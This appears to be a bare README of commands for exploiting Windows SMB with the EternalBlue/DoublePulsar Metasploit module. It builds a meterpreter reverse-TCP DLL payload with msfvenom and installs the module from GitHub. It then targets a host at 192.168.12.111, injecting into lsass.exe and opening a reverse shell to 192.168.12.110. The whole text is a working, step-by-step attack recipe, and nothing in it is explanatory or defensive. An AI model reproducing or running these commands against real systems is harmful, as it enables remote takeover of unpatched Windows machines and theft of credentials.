# Eternalblue-Doublepulsar-Metasploit
<pre>
wine cmd.exe
exit

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.12.110 lport=4444 -f dll -o /root/.wine/drive_c/eternal11.dll

cd /usr/share/metasploit-framework/modules/exploits/windows/smb
git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
mv Eternalblue-Doublepulsar-Metasploit/deps/ eternalblue_doublepulsar.rb ./

service postgresql start
msfconsole
reload_all

use exploit/windows/smb/eternalblue_doublepulsar
set DOUBLEPULSARPATH /usr/share/metasploit-framework/modules/exploits/windows/smb/deps
set ETERNALBLUEPATH /usr/share/metasploit-framework/modules/exploits/windows/smb/deps
set PROCESSINJECT lsass.exe
set TARGETARCHITECTURE  x64
set rhost 192.168.12.111
show targets
set target 8
set payload windows/x64/meterpreter/reverse_tcp
show options
set lhost 192.168.12.110

exploit
</pre>



